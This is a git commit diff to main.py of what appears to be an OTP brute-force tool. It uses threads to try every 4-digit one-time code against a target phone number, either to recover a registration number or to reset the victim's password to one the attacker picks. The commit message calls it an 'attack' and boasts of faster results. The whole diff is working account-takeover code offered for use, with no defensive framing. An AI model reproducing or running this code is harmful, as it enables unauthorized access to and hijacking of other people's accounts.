713548ea6fad037b45ac3117ee78e88b5936f07b
Monazir Muhammad Doha <70005698+Itsmmdoha@users.noreply.github.com>
2023-06-22 18:19:34 +0600

    This update brings multi-threading
    This attack brings two new features,
    1. OTP's are randomly tried 
    2. Multi-threading is used across all attacks

--- main.py
+++ main.py
@@ -1,6 +1,22 @@
 from assist import ChangePassword, getRegNumber
+from time import sleep
+import random
+from concurrent.futures import ThreadPoolExecutor as TPE
+from queue import Queue as Q
 
+NumberOfThreads = 5
+q = Q()
+with open("4digits.txt") as f:
+    otpList = []
+    for line in f:
+        otpList.append(line[0:4])
+    for otp in range(0,10000):
+        random_otp = random.choice(otpList)
+        q.put(random_otp)
+        otpList.remove(random_otp)
 print("""
+      --->This update uses multi-threadin. Hence, even faster results!<---
+      
 what do you want?
 
 1) Get registration number from Nickname & Phone Number
@@ -9,20 +25,37 @@ what do you want?
 
 """)
 
+
 choice = int(input("(1/2): "))
 phone = input("PhoneNumber(example:88017********): ")
 if choice==1:
     nickname = input("Type nickname(case sensitive): ")
     target = getRegNumber(phone,nickname)
     target.req_otp()
-    target.crack_otp()
+    print("otp sent")
+    def crack():
+        while target.wrongOTP:
+            otp = q.get()
+            target.tryOTP(otp)
+    with TPE(max_workers=NumberOfThreads) as executor:
+        executor.submit(crack)
+
+
 elif choice==2:
     registration = input("Registration number:")
     target = ChangePassword(phone, registration)
     target.req_otp()
-    target.crack_otp()
+    def crack():
+        while target.wrongOTP:
+            otp = q.get()
+            target.tryOTP(otp)
     NewPassword = input("Type a new password (atleast 6 charecters long):")
+    with TPE(max_workers=NumberOfThreads) as executor:
+        executor.submit(crack)
+    while target.wrongOTP:
+        sleep(1)
     target.changePass(NewPassword)
+    print("Password was changed to:",NewPassword)
 else:
     print("Invalid input")
     exit()
